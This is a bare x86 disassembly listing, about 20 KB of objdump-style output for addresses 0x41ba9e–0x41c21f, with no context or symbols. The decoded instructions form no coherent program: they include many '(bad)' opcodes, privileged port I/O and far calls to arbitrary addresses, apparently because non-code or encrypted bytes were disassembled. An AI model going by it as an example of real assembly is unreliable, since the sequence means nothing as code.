  41ba9e:	jg     0x41bad9
  41baa0:	in     al,0x8c
  41baa2:	repnz cmp BYTE PTR [ecx],bh
  41baa5:	xor    eax,0x42ea2e9f
  41baaa:	jmp    0x41bb26
  41baac:	pop    ebx
  41baad:	or     ah,BYTE PTR [ebx]
  41baaf:	dec    ebx
  41bab0:	pop    ecx
  41bab1:	push   esp
  41bab2:	enter  0x3575,0x86
  41bab6:	(bad)  
  41bab7:	push   eax
  41bab8:	scas   al,BYTE PTR es:[edi]
  41bab9:	push   ebp
  41baba:	mov    dl,0xab
  41babc:	enter  0x5a16,0x3f
  41bac0:	mov    eax,ds:0x6aa583f
  41bac5:	clc    
  41bac6:	adc    DWORD PTR [esi],eax
  41bac8:	mov    bh,0x68
  41baca:	dec    esp
  41bacb:	mov    WORD PTR [edx],ds
  41bacd:	iret   
  41bace:	test   al,0x6b
  41bad0:	jle    0x41bac1
  41bad2:	jecxz  0x41ba91
  41bad4:	inc    edx
  41bad5:	fs (bad) 
  41bad7:	enter  0x2637,0xfd
  41badb:	stos   BYTE PTR es:[edi],al
  41badc:	data16 fisubr DWORD PTR [esi]
  41badf:	ror    ebx,cl
  41bae1:	mov    eax,0xd0ef8bff
  41bae6:	dec    edx
  41bae7:	lods   eax,DWORD PTR ds:[esi]
  41bae8:	sub    al,0xcd
  41baea:	retf   0x9ea5
  41baed:	cmp    DWORD PTR [edx],0xa62ac7d0
  41baf3:	bound  esp,QWORD PTR [esi-0x7c]
  41baf6:	jle    0x41bb53
  41baf8:	or     DWORD PTR [edi-0x75],ebx
  41bafb:	out    0x10,al
  41bafd:	lahf   
  41bafe:	mov    al,ds:0x7ac8740d
  41bb03:	rcl    BYTE PTR [esi-0x7d],0x57
  41bb07:	pop    ds
  41bb08:	sbb    ah,BYTE PTR ds:0x20e855d0
  41bb0e:	mov    dh,0x23
  41bb10:	stc    
  41bb11:	push   edi
  41bb12:	pushw  0xf8b4
  41bb16:	test   eax,0x914a8b53
  41bb1b:	xor    eax,0x107a2a83
  41bb20:	mov    bh,0x87
  41bb22:	call   0xef6c:0xd2f05240
  41bb29:	imul   ecx,DWORD PTR [eax+0x7b7cdec],0x38
  41bb30:	push   0xa11f62be
  41bb35:	sbb    dl,BYTE PTR [ecx+0x14e44b53]
  41bb3b:	xor    cl,BYTE PTR [ebp+esi*1+0x40]
  41bb3f:	test   eax,0xd4739d27
  41bb44:	pop    ebp
  41bb45:	mov    al,0x5b
  41bb47:	pop    esp
  41bb48:	mov    ds:0x9dc9f314,al
  41bb4d:	lea    edi,es:[eax+0x56eb6e34]
  41bb54:	pushfw 
  41bb56:	retf   
  41bb57:	pop    ebx
  41bb58:	div    edx
  41bb5a:	and    ecx,DWORD PTR [edi]
  41bb5c:	into   
  41bb5d:	dec    edx
  41bb5e:	push   eax
  41bb5f:	push   ebp
  41bb60:	(bad)  
  41bb61:	stc    
  41bb62:	dec    edx
  41bb63:	fxch   st(3)
  41bb65:	fwait
  41bb66:	xchg   edx,eax
  41bb67:	jb     0x41bb24
  41bb69:	fistp  DWORD PTR [edi]
  41bb6b:	or     eax,0x23
  41bb6e:	jbe    0x41bb52
  41bb70:	(bad)  
  41bb71:	div    BYTE PTR [ebx+0x18]
  41bb74:	test   DWORD PTR [ebx],ecx
  41bb76:	inc    edx
  41bb77:	mov    edi,0xe653e602
  41bb7c:	sbb    eax,0xb16bdcee
  41bb81:	cld    
  41bb82:	in     al,dx
  41bb83:	js     0x41bbb5
  41bb85:	adc    al,0x64
  41bb87:	add    DWORD PTR [esi+0x23ca973a],ecx
  41bb8d:	cmp    ecx,edi
  41bb8f:	and    dh,BYTE PTR [eax+0x5eb2695a]
  41bb95:	sub    BYTE PTR [eax+ebx*4-0x4bf3e654],ch
  41bb9c:	mov    ds:0xe8e00311,al
  41bba1:	pop    DWORD PTR [ebp+0x51]
  41bba4:	aad    0xd6
  41bba6:	loope  0x41bb68
  41bba8:	xchg   ebp,eax
  41bba9:	retf   
  41bbaa:	fmul   st,st(3)
  41bbac:	lds    eax,FWORD PTR [edx]
  41bbae:	mov    edi,0x3441c3f2
  41bbb3:	in     eax,0x22
  41bbb5:	cs sub al,0x8a
  41bbb8:	fiadd  WORD PTR [eax+edx*1]
  41bbbb:	pop    ds
  41bbbc:	mov    ah,0x8e
  41bbbe:	jno    0x41bbbd
  41bbc0:	mov    WORD PTR [edi],?
  41bbc2:	inc    esi
  41bbc3:	xor    esp,DWORD PTR [edi]
  41bbc5:	jmp    0x47f79e87
  41bbca:	(bad)  [ecx]
  41bbcc:	test   al,0xc6
  41bbce:	mov    WORD PTR [edx],cs
  41bbd0:	fcomp  st(4)
  41bbd2:	test   BYTE PTR [ebx+0xa],0x5
  41bbd6:	shl    DWORD PTR [ecx+0x2563e62],0x30
  41bbdd:	(bad)  
  41bbde:	repz in eax,0xf0
  41bbe1:	xchg   ecx,eax
  41bbe2:	shr    BYTE PTR [edx-0x20],cl
  41bbe5:	ss pop ds
  41bbe7:	in     al,dx
  41bbe8:	popa   
  41bbe9:	sar    BYTE PTR [edx+0x1b],cl
  41bbec:	push   es
  41bbed:	mov    edi,0xb7dd92bb
  41bbf2:	add    DWORD PTR [edi+0x59fe2760],esi
  41bbf8:	fdivp  st(0),st
  41bbfa:	dec    esi
  41bbfb:	adc    ebx,DWORD PTR [edx+edi*1-0x2f]
  41bbff:	xor    ebp,DWORD PTR [ecx-0x79]
  41bc02:	mov    al,cl
  41bc04:	mov    edx,0x59e00205
  41bc09:	in     eax,dx
  41bc0a:	test   ebp,edi
  41bc0c:	and    BYTE PTR [si+0x814],ch
  41bc11:	mov    al,0xfe
  41bc13:	mov    ebx,0x49aa0daf
  41bc18:	add    al,0xea
  41bc1a:	fild   WORD PTR [eax+0xa]
  41bc1d:	out    dx,eax
  41bc1e:	dec    esp
  41bc1f:	xor    edx,esp
  41bc21:	push   edx
  41bc22:	fs jb  0x41bbaa
  41bc25:	dec    ecx
  41bc26:	fst    DWORD PTR [eax]
  41bc28:	stos   BYTE PTR es:[edi],al
  41bc29:	and    al,0x3a
  41bc2b:	sbb    ebp,DWORD PTR [edx-0x7e]
  41bc2e:	aaa    
  41bc2f:	adc    eax,0xba086c88
  41bc34:	enter  0x4357,0xb3
  41bc38:	iret   
  41bc39:	nop
  41bc3a:	dec    ebx
  41bc3b:	sbb    eax,0x2aa466ca
  41bc40:	stc    
  41bc41:	push   0xc946db1f
  41bc46:	inc    ebp
  41bc47:	out    dx,al
  41bc48:	hlt    
  41bc49:	dec    ebp
  41bc4a:	jge    0x41bcc3
  41bc4c:	inc    esp
  41bc4d:	mov    edi,DWORD PTR [esi-0x41]
  41bc50:	mov    WORD PTR [ebp+ebp*2+0xb],ds
  41bc54:	and    ecx,ebx
  41bc56:	shl    DWORD PTR [esp+esi*1],1
  41bc59:	lea    edi,[esi]
  41bc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc5c:	xchg   edx,eax
  41bc5d:	mov    ebx,0x2fa8b71b
  41bc62:	js     0x41bc7a
  41bc64:	xor    ecx,esi
  41bc66:	shr    DWORD PTR [ebp-0x4231baf7],0x3d
  41bc6d:	xor    edx,esi
  41bc6f:	mov    edx,0xff0f25d3
  41bc74:	frndint 
  41bc76:	ja     0x41bc9d
  41bc78:	cwde   
  41bc79:	mov    cl,0x90
  41bc7b:	ja     0x41bc7d
  41bc7d:	sbb    BYTE PTR cs:[esi+edi*1],al
  41bc81:	ret    0xdf46
  41bc84:	repz jge 0x41bca7
  41bc87:	mov    edx,0x2a5cdf6b
  41bc8c:	push   ecx
  41bc8d:	scas   al,BYTE PTR es:[edi]
  41bc8e:	mov    eax,0xe43714a4
  41bc93:	inc    ebp
  41bc94:	jle    0x41bc42
  41bc96:	data16 and al,0x7
  41bc99:	loope  0x41bcb9
  41bc9b:	ja     0x41bc47
  41bc9d:	stos   BYTE PTR es:[edi],al
  41bc9e:	mov    ss,esp
  41bca0:	pop    ss
  41bca1:	pop    ebx
  41bca2:	push   es
  41bca3:	movq   QWORD PTR [ebx-0x15],mm6
  41bca7:	sar    DWORD PTR [esi-0x72],cl
  41bcaa:	sbb    esi,DWORD PTR [ecx+0x7]
  41bcad:	sub    eax,0x64cf8982
  41bcb2:	dec    ebp
  41bcb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb4:	inc    ecx
  41bcb5:	dec    edi
  41bcb6:	lock add ah,cl
  41bcb9:	mov    ecx,0x9a0f2d5d
  41bcbe:	daa    
  41bcbf:	mov    esp,ecx
  41bcc1:	js     0x41bcae
  41bcc3:	push   ebp
  41bcc4:	and    DWORD PTR [ebx+0x61],edx
  41bcc7:	adc    ebx,0xfffffff9
  41bcca:	ss out dx,eax
  41bccc:	jmp    0xf461:0xad8d8cc6
  41bcd3:	mul    DWORD PTR [eax-0x4a64d5cf]
  41bcd9:	int    0x54
  41bcdb:	out    0x80,al
  41bcdd:	push   esi
  41bcde:	call   DWORD PTR [edx-0x3]
  41bce1:	call   0x9f797372
  41bce6:	aas    
  41bce7:	mov    ah,0xc4
  41bce9:	sub    DWORD PTR [edx*1-0x45f86e9],0xffffff84
  41bcf1:	sbb    DWORD PTR [edi+0x21],ebp
  41bcf4:	bsr    eax,DWORD PTR [edx+ecx*4-0x3d]
  41bcf9:	fcom   QWORD PTR [ecx]
  41bcfb:	out    0x36,eax
  41bcfd:	inc    ecx
  41bcfe:	cmp    ch,cl
  41bd00:	lock hlt 
  41bd02:	(bad)  
  41bd03:	push   esp
  41bd04:	mov    al,ds:0x1e6c8d
  41bd09:	inc    eax
  41bd0a:	push   edx
  41bd0b:	nop
  41bd0c:	in     al,0xc8
  41bd0e:	ror    DWORD PTR [ecx+0x3],0x1e
  41bd12:	mov    eax,ds:0x691c9aef
  41bd17:	mov    edx,0xbfbd5277
  41bd1c:	mov    dl,ah
  41bd1e:	or     dl,BYTE PTR ds:0x8f98e976
  41bd24:	push   eax
  41bd25:	es in  al,0x54
  41bd28:	jnp    0x41bcb5
  41bd2a:	push   ss
  41bd2b:	dec    esp
  41bd2c:	jecxz  0x41bd9e
  41bd2e:	hlt    
  41bd2f:	push   0xffffffc2
  41bd31:	call   0xd47208e0
  41bd36:	fs fs push ds
  41bd39:	lock fist WORD PTR [ebx-0x388fef9]
  41bd40:	cmp    al,0x32
  41bd42:	dec    esp
  41bd43:	mov    ebp,0x3568f59c
  41bd48:	push   esp
  41bd49:	add    al,0xcf
  41bd4b:	cmp    al,0x87
  41bd4d:	nop
  41bd4e:	xlat   BYTE PTR ds:[ebx]
  41bd4f:	ficomp WORD PTR [ecx]
  41bd51:	int    0xab
  41bd53:	scas   eax,DWORD PTR es:[edi]
  41bd54:	pop    edi
  41bd55:	adc    DWORD PTR [edx+0x138ea771],0x9
  41bd5c:	xor    al,0xf8
  41bd5e:	sub    DWORD PTR ss:[edi-0x56480d4f],esi
  41bd65:	stos   DWORD PTR es:[edi],eax
  41bd66:	test   al,0x17
  41bd68:	ja     0x41bd90
  41bd6a:	xor    ebp,DWORD PTR [ebp-0x16]
  41bd6d:	fwait
  41bd6e:	sbb    esp,edi
  41bd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd71:	cmp    al,BYTE PTR [esi-0x62]
  41bd74:	and    al,0xaa
  41bd76:	pop    ebp
  41bd77:	jp     0x41bd48
  41bd79:	fisttp WORD PTR [edx]
  41bd7b:	ret    
  41bd7c:	aam    0x38
  41bd7e:	repnz ds out dx,eax
  41bd81:	push   es
  41bd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd83:	stos   DWORD PTR es:[edi],eax
  41bd84:	mul    edx
  41bd86:	cmp    dh,ch
  41bd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd89:	mov    ecx,DWORD PTR ds:0x72878427
  41bd8f:	xor    edi,0x40
  41bd92:	and    edi,esi
  41bd94:	or     ch,bl
  41bd96:	push   ds
  41bd97:	pop    edi
  41bd98:	xor    eax,0xa32b381e
  41bd9d:	bound  esi,QWORD PTR [ebx+0x59123f1]
  41bda3:	or     DWORD PTR [ebx-0x5f4f5c92],edi
  41bda9:	jmp    0x6442:0x7ef3d60a
  41bdb0:	sbb    ch,BYTE PTR [edi+0x24e3c9c1]
  41bdb6:	in     eax,dx
  41bdb7:	jb     0x41bdbd
  41bdb9:	repnz xor DWORD PTR [edx],0x41
  41bdbd:	mov    ebx,0x7e39e128
  41bdc2:	inc    edi
  41bdc3:	xchg   ecx,eax
  41bdc4:	mov    DWORD PTR [edx+0x7f],ebx
  41bdc7:	jae    0x41bd7e
  41bdc9:	push   0x31
  41bdcb:	xlat   BYTE PTR ds:[ebx]
  41bdcc:	sub    cl,BYTE PTR [ebp+0x52433353]
  41bdd2:	ret    0xb61d
  41bdd5:	mov    ecx,0xa879530c
  41bdda:	and    DWORD PTR [ebp+edi*2-0x5673c5f1],0xb4c4c2a2
  41bde5:	cmp    ah,BYTE PTR [ebp+0x136bfccf]
  41bdeb:	popa   
  41bdec:	jb     0x41be40
  41bdee:	jecxz  0x41be6b
  41bdf0:	aaa    
  41bdf1:	jg     0x41be21
  41bdf3:	sbb    cl,bh
  41bdf5:	inc    ebx
  41bdf6:	lahf   
  41bdf7:	call   0xccddbb68
  41bdfc:	sub    BYTE PTR [edx+0x55c34ed5],dh
  41be02:	into   
  41be03:	push   ds
  41be04:	dec    ebp
  41be05:	jbe    0x41bddf
  41be07:	mul    BYTE PTR [edx+0x22af7478]
  41be0d:	push   ebp
  41be0e:	adc    DWORD PTR [eax+edx*2-0x34c8af47],edx
  41be15:	push   0xd472084b
  41be1a:	cwde   
  41be1b:	cmp    eax,0x4e0350f6
  41be20:	inc    eax
  41be21:	daa    
  41be22:	add    dh,BYTE PTR [ebx+0x12]
  41be25:	pop    es
  41be26:	pop    ds
  41be27:	cmp    eax,0x8d141db7
  41be2c:	sbb    ah,BYTE PTR ds:0x91185a50
  41be32:	inc    ebx
  41be33:	loop   0x41bde1
  41be35:	das    
  41be36:	pop    eax
  41be37:	je     0x41be46
  41be39:	fnstsw WORD PTR [edx-0x63caa851]
  41be3f:	sti    
  41be40:	mov    eax,0xcbae0b26
  41be45:	adc    ah,BYTE PTR [ebx+edi*2-0x2d]
  41be49:	pusha  
  41be4a:	cmp    al,0xe
  41be4c:	inc    ebx
  41be4d:	mov    edx,0xb15b5eeb
  41be52:	dec    esp
  41be53:	(bad)  
  41be54:	mov    edx,0x1ab46baa
  41be59:	adc    edx,DWORD PTR [esi+edx*2-0x4a]
  41be5d:	adc    DWORD PTR [esp+esi*1+0x6c],ebx
  41be61:	mov    edi,0x9e5b2186
  41be66:	jne    0x41bee1
  41be68:	js     0x41be05
  41be6a:	xlat   BYTE PTR ds:[ebx]
  41be6b:	cmp    eax,0x636033fa
  41be70:	adc    ebx,DWORD PTR [edx]
  41be72:	or     DWORD PTR [ecx],0xffffffb4
  41be75:	sbb    DWORD PTR [eax+0x6b],edx
  41be78:	xchg   DWORD PTR [eax+0x9],esp
  41be7b:	and    esp,DWORD PTR [edi]
  41be7d:	xor    al,0xbe
  41be7f:	dec    esp
  41be80:	xlat   BYTE PTR ds:[ebx]
  41be81:	cdq    
  41be82:	dec    eax
  41be83:	(bad)  
  41be84:	mov    ebp,0x583d1584
  41be89:	xor    al,0x76
  41be8b:	cmp    ecx,DWORD PTR [eax]
  41be8d:	xor    al,0xe7
  41be8f:	adc    al,0xee
  41be91:	sbb    BYTE PTR [ebx],ch
  41be93:	xchg   esp,eax
  41be94:	inc    eax
  41be95:	call   0xa5da:0x4a3ab1b9
  41be9c:	ins    DWORD PTR es:[edi],dx
  41be9d:	sbb    BYTE PTR [edx],dl
  41be9f:	fstp   QWORD PTR [ecx+0x2dbdf3a9]
  41bea5:	cmc    
  41bea6:	sbb    DWORD PTR [ebp+0x3f],eax
  41bea9:	das    
  41beaa:	mov    bl,0xff
  41beac:	adc    BYTE PTR [edi],ch
  41beae:	xchg   esi,eax
  41beaf:	xchg   esi,eax
  41beb0:	sub    bh,dh
  41beb2:	call   0x96ac:0x9edd7638
  41beb9:	ror    BYTE PTR [ecx+0x3277e4f4],0xb
  41bec0:	sub    dh,0xff
  41bec3:	push   ss
  41bec4:	adc    edi,DWORD PTR [edx-0x3d6820d1]
  41beca:	push   ebp
  41becb:	fistp  WORD PTR [esi+0x243c589]
  41bed1:	out    dx,eax
  41bed2:	cmp    ch,BYTE PTR [edx]
  41bed4:	test   DWORD PTR [ebp+0x18d23076],0x3b7f1311
  41bede:	sub    esp,DWORD PTR [esi-0x531988b1]
  41bee4:	mov    BYTE PTR [ebx],dh
  41bee6:	jo     0x41beee
  41bee8:	stos   DWORD PTR es:[edi],eax
  41bee9:	jnp    0x41bf0a
  41beeb:	sub    cl,BYTE PTR [esi+ecx*4+0x45]
  41beef:	mov    bl,0xb4
  41bef1:	enter  0x6244,0x0
  41bef5:	out    dx,al
  41bef6:	aas    
  41bef7:	(bad)  
  41bef8:	(bad)  
  41bef9:	(bad)  
  41befb:	adc    DWORD PTR [ebx+0x53742b74],eax
  41bf01:	dec    ecx
  41bf02:	sub    BYTE PTR [ecx],cl
  41bf04:	and    eax,0x72381435
  41bf09:	push   ebp
  41bf0a:	loop   0x41bf79
  41bf0c:	adc    eax,0x1dcecf6f
  41bf11:	cmp    cl,BYTE PTR [ebp+0xe530f70]
  41bf17:	out    dx,al
  41bf18:	push   cs
  41bf19:	in     eax,0x61
  41bf1b:	add    ecx,eax
  41bf1d:	js     0x41bef3
  41bf1f:	ror    BYTE PTR [esp+ebx*8+0x4b],cl
  41bf23:	cdq    
  41bf24:	scas   al,BYTE PTR es:[edi]
  41bf25:	jge    0x41bf81
  41bf27:	jo     0x41bec3
  41bf29:	cmp    DWORD PTR [ebx],edi
  41bf2b:	in     al,0x56
  41bf2d:	in     eax,0x9b
  41bf2f:	mul    DWORD PTR [edi]
  41bf31:	pop    es
  41bf32:	jecxz  0x41bec8
  41bf34:	xor    eax,0x45d2632e
  41bf39:	and    DWORD PTR [ecx],edi
  41bf3b:	mov    DWORD PTR [esi+0x32],eax
  41bf3e:	sub    al,0xe1
  41bf40:	xor    al,0xc0
  41bf42:	in     eax,0xe3
  41bf44:	ret    0xb99b
  41bf47:	inc    ebp
  41bf48:	xchg   ebx,eax
  41bf49:	mov    BYTE PTR [ebp+0x37],dl
  41bf4c:	lods   eax,DWORD PTR ds:[esi]
  41bf4d:	(bad)  
  41bf4e:	mov    ecx,0xab55d78f
  41bf53:	and    bh,al
  41bf55:	inc    ebp
  41bf56:	arpl   ax,di
  41bf58:	mov    eax,ds:0x512965d0
  41bf5d:	inc    edx
  41bf5e:	xor    al,BYTE PTR [edx+0x37e69271]
  41bf64:	andps  xmm5,XMMWORD PTR [ecx]
  41bf67:	or     DWORD PTR [ecx+edi*8+0x52e404b4],ecx
  41bf6e:	xor    esp,DWORD PTR [eax]
  41bf70:	add    BYTE PTR [ebp+0xb76fc01],cl
  41bf76:	call   0xe1b8:0x4309606
  41bf7d:	xchg   esp,eax
  41bf7e:	lods   al,BYTE PTR ds:[esi]
  41bf7f:	pop    ecx
  41bf80:	mov    esp,ebp
  41bf82:	jo     0x41bf95
  41bf84:	retf   0x3a41
  41bf87:	and    ecx,DWORD PTR [ebx]
  41bf89:	sub    DWORD PTR [eax+0x58],edx
  41bf8c:	add    esi,DWORD PTR [edx+0x17f73c21]
  41bf92:	xchg   ebp,eax
  41bf93:	mov    ah,0xd9
  41bf95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf96:	dec    eax
  41bf97:	push   es
  41bf98:	jg     0x41bfb6
  41bf9a:	outs   dx,BYTE PTR ds:[esi]
  41bf9b:	ffreep st(7)
  41bf9d:	inc    ebx
  41bf9e:	ficom  DWORD PTR [edi]
  41bfa0:	sar    BYTE PTR [ecx+0x12],1
  41bfa3:	popa   
  41bfa4:	xor    eax,0xc4d9f537
  41bfa9:	and    BYTE PTR [ebx-0x74],0x3a
  41bfad:	pop    ebx
  41bfae:	(bad)  
  41bfb0:	pop    ss
  41bfb1:	add    eax,0x2c931560
  41bfb6:	mov    dh,0xf0
  41bfb8:	xlat   BYTE PTR ds:[ebx]
  41bfb9:	addr16 push esp
  41bfbb:	adc    al,0x91
  41bfbd:	js     0x41bf41
  41bfbf:	fisttp WORD PTR [edx+0x5a]
  41bfc2:	sbb    ch,BYTE PTR [eax+0x6ecaac29]
  41bfc8:	data16 je 0x41bf86
  41bfcb:	pusha  
  41bfcc:	dec    eax
  41bfcd:	out    dx,eax
  41bfce:	add    eax,0x3a
  41bfd1:	int3   
  41bfd2:	dec    esi
  41bfd3:	pop    edi
  41bfd4:	pop    ss
  41bfd5:	jnp    0x41bf64
  41bfd7:	and    bl,0xd7
  41bfda:	mov    eax,0xfcbc08bc
  41bfdf:	pusha  
  41bfe0:	dec    edi
  41bfe1:	popa   
  41bfe2:	push   0x830c0009
  41bfe7:	add    BYTE PTR [ecx-0x38],bl
  41bfea:	or     bl,BYTE PTR [eax-0x7232431]
  41bff0:	and    BYTE PTR [ebp+0x5f144ad8],dl
  41bff6:	fwait
  41bff7:	je     0x41c067
  41bff9:	cmp    BYTE PTR [ecx-0x38fb8b07],0xca
  41c000:	adc    al,0x58
  41c002:	and    al,0xb2
  41c004:	rcr    dh,1
  41c006:	pop    ebp
  41c007:	inc    ecx
  41c008:	in     eax,0x8e
  41c00a:	cmp    esp,edx
  41c00c:	dec    eax
  41c00d:	push   esp
  41c00e:	in     al,0x60
  41c010:	into   
  41c011:	cmc    
  41c012:	(bad)  
  41c013:	outs   dx,DWORD PTR ds:[esi]
  41c014:	mov    cl,BYTE PTR [eax+0x7f]
  41c017:	dec    edi
  41c018:	shl    BYTE PTR [edi+eax*2-0x11],1
  41c01c:	adc    DWORD PTR [edx],edi
  41c01e:	rcr    BYTE PTR [ebp-0x4fed7cce],1
  41c024:	cli    
  41c025:	jecxz  0x41bfb4
  41c027:	cmp    DWORD PTR [ecx],esi
  41c029:	xchg   BYTE PTR [esi-0xae1e348],ch
  41c02f:	cdq    
  41c030:	push   ebp
  41c031:	mov    BYTE PTR [ebp+0x16abbaea],dl
  41c037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c038:	cli    
  41c039:	pop    ebp
  41c03a:	sbb    al,0xc7
  41c03c:	xor    ah,BYTE PTR [eax-0xd]
  41c03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c040:	mov    cl,0xb
  41c042:	(bad)  
  41c043:	mov    ebx,0x7cc99a37
  41c048:	push   ds
  41c049:	mov    eax,ds:0xd0a1bff9
  41c04e:	or     ah,cl
  41c050:	xchg   edx,eax
  41c051:	mov    dl,0x91
  41c053:	call   0x2f74e712
  41c058:	pop    ss
  41c059:	cmp    DWORD PTR [ecx-0x7c],esp
  41c05c:	xor    ah,BYTE PTR [ecx]
  41c05e:	fnstenv [edx-0x4b]
  41c061:	mov    edi,0x4d4b68f8
  41c066:	rcr    DWORD PTR ds:0xadc91238,cl
  41c06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c06d:	fiadd  WORD PTR [ebp+0x6ef8257d]
  41c073:	or     esi,eax
  41c075:	sbb    bl,dl
  41c077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c078:	jns    0x41c017
  41c07a:	mov    bl,0x85
  41c07c:	and    cl,ch
  41c07e:	shl    BYTE PTR [ebx-0x37],cl
  41c081:	test   al,0xba
  41c083:	imul   ecx,DWORD PTR [ebp+0x2c],0x934b969
  41c08a:	hlt    
  41c08b:	pop    ebx
  41c08c:	xor    eax,0x8b52b9b8
  41c092:	pop    eax
  41c093:	jle    0x41c0c7
  41c095:	das    
  41c096:	dec    eax
  41c097:	les    edi,FWORD PTR [edi+0x8]
  41c09a:	cdq    
  41c09b:	aaa    
  41c09c:	xchg   ebp,eax
  41c09d:	mov    esi,0x3ebacd87
  41c0a2:	xor    DWORD PTR ds:0x207c1be3,0xd83d777a
  41c0ac:	inc    ebx
  41c0ad:	and    esp,ebp
  41c0af:	lds    edi,FWORD PTR [ecx-0x66]
  41c0b2:	repz sub al,0x37
  41c0b5:	test   edi,0xaee4729e
  41c0bb:	sbb    BYTE PTR [edi],0x26
  41c0be:	dec    esi
  41c0bf:	lods   al,BYTE PTR ds:[esi]
  41c0c0:	push   edi
  41c0c1:	ins    DWORD PTR es:[edi],dx
  41c0c2:	fcomp  QWORD PTR [ecx]
  41c0c4:	or     ah,ah
  41c0c6:	inc    esp
  41c0c7:	pop    edi
  41c0c8:	xchg   edi,eax
  41c0c9:	das    
  41c0ca:	fcmovnb st,st(0)
  41c0cc:	mov    ebx,0x4a519abf
  41c0d1:	pop    edi
  41c0d2:	sub    DWORD PTR [ebx+0x31cc6265],ecx
  41c0d8:	mov    eax,0xdbd08e32
  41c0dd:	loopne 0x41c100
  41c0df:	hlt    
  41c0e0:	push   ss
  41c0e1:	push   esi
  41c0e2:	cmc    
  41c0e3:	xchg   edi,eax
  41c0e4:	call   0x7f3e:0x86c2882a
  41c0eb:	scas   al,BYTE PTR es:[edi]
  41c0ec:	adc    bl,BYTE PTR ds:0xb0f3bc56
  41c0f2:	xor    eax,0x3da1e9df
  41c0f7:	mov    WORD PTR [ebp+0x52c068f1],?
  41c0fd:	push   es
  41c0fe:	push   0xb1853a7
  41c103:	ror    DWORD PTR [edi],1
  41c105:	and    DWORD PTR ds:0x5f2f280b,0xffffffc6
  41c10c:	adc    eax,0xfdc1370a
  41c111:	dec    ecx
  41c112:	inc    edi
  41c113:	xor    eax,0xb3745cc
  41c118:	dec    ebp
  41c119:	sahf   
  41c11a:	test   DWORD PTR [edi-0x6b44b0d4],edx
  41c120:	xchg   ebx,eax
  41c121:	adc    al,0x77
  41c123:	inc    esi
  41c124:	arpl   dx,di
  41c126:	and    al,0x15
  41c128:	xor    BYTE PTR [esi+0x7d19a122],dh
  41c12e:	xchg   ebp,eax
  41c12f:	aaa    
  41c130:	jl     0x41c0f8
  41c132:	cwde   
  41c133:	js     0x41c12e
  41c135:	add    ah,BYTE PTR [edi+0x4a]
  41c138:	or     ah,BYTE PTR [eax]
  41c13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c13b:	jo     0x41c177
  41c13d:	xlat   BYTE PTR ds:[ebx]
  41c13e:	pop    eax
  41c13f:	xlat   BYTE PTR ds:[ebx]
  41c140:	adc    edx,eax
  41c142:	in     eax,0x1d
  41c144:	adc    BYTE PTR [edx-0x7d],0x15
  41c148:	add    al,BYTE PTR es:[edx-0x56]
  41c14c:	test   eax,0xa3a851d4
  41c151:	mov    BYTE PTR [ebx-0x38],bh
  41c154:	push   edx
  41c155:	xchg   ebx,eax
  41c156:	fistp  DWORD PTR [esi+0x15a3c9b9]
  41c15c:	or     DWORD PTR [edi],ebp
  41c15e:	and    DWORD PTR [esi+esi*1-0x5855afea],0x5676f9c0
  41c169:	jbe    0x41c192
  41c16b:	inc    ebx
  41c16c:	imul   ecx,DWORD PTR [ebp+0x51],0xffffff9a
  41c170:	jmp    0xa612b27c
  41c175:	adc    BYTE PTR [esi-0x7352da39],0x6d
  41c17c:	pushw  ds
  41c17e:	in     al,dx
  41c17f:	je     0x41c12e
  41c181:	jbe    0x41c12a
  41c183:	dec    eax
  41c184:	out    dx,al
  41c185:	pop    ecx
  41c186:	mov    al,BYTE PTR [eax+eax*8+0x2766239]
  41c18d:	mov    ds:0xfb6486f1,eax
  41c192:	test   al,0xbb
  41c194:	loopne 0x41c166
  41c196:	mov    ss,WORD PTR [edx-0x60]
  41c199:	mov    edi,0x994762e1
  41c19e:	mov    edx,DWORD PTR [edx-0x48]
  41c1a1:	scas   eax,DWORD PTR es:[edi]
  41c1a2:	and    eax,0xb467cdd9
  41c1a7:	xchg   edx,eax
  41c1a8:	aas    
  41c1a9:	push   ecx
  41c1aa:	dec    esp
  41c1ab:	jne    0x41c1b5
  41c1ad:	cs push edx
  41c1af:	xchg   ebx,eax
  41c1b0:	sar    DWORD PTR [esi+0x2],1
  41c1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1b4:	cmp    eax,0xb2089ae0
  41c1b9:	out    0x68,al
  41c1bb:	fist   WORD PTR [edx]
  41c1bd:	mov    bh,0xab
  41c1bf:	shl    BYTE PTR [ebp+ebp*4+0x3c],1
  41c1c3:	aad    0xd5
  41c1c5:	or     BYTE PTR [edi],0x17
  41c1c8:	mov    dl,0x61
  41c1ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1cb:	add    eax,0xfc95c7e0
  41c1d0:	mov    ebp,0x5353d461
  41c1d5:	pop    edx
  41c1d6:	or     bh,BYTE PTR [edi]
  41c1d8:	pop    esi
  41c1d9:	mov    dh,0xe3
  41c1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1dc:	mov    es,eax
  41c1de:	popa   
  41c1df:	imul   ebx,DWORD PTR [esi-0x2b],0xffffff8f
  41c1e3:	out    0x13,eax
  41c1e5:	mov    ebx,esp
  41c1e7:	call   0xa11e:0x1444741c
  41c1ee:	xor    eax,0xd9adfce0
  41c1f3:	test   cl,dh
  41c1f5:	cli    
  41c1f6:	adc    DWORD PTR [eax-0x768e0ff7],ebp
  41c1fc:	into   
  41c1fd:	cmp    ebx,DWORD PTR [edx-0x3d2273d3]
  41c203:	pop    eax
  41c204:	or     bl,BYTE PTR [edi+0x24101765]
  41c20a:	mov    edx,0x95439c09
  41c20f:	jmp    0xfe95:0x14afe170
  41c216:	xchg   esp,eax
  41c217:	pop    eax
  41c218:	fadd   QWORD PTR [ecx]
  41c21a:	mov    eax,0xd1a0a193
  41c21f:	stc    
